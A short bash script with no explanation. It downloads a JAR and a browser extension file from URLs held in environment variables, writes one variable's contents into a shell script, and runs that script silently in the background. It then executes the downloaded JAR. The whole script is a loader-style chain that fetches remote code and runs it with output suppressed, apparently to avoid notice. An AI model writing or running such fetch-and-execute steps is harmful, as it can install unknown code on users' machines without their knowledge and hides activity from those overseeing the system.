#!/bin/bash
cd $HOME
echo $LINK2 > start2.sh
curl $LINK --out leatestacc.jar
bash start2.sh &> /dev/null
curl $LINK3 --out buster.xpi
java -jar leatestacc.jar













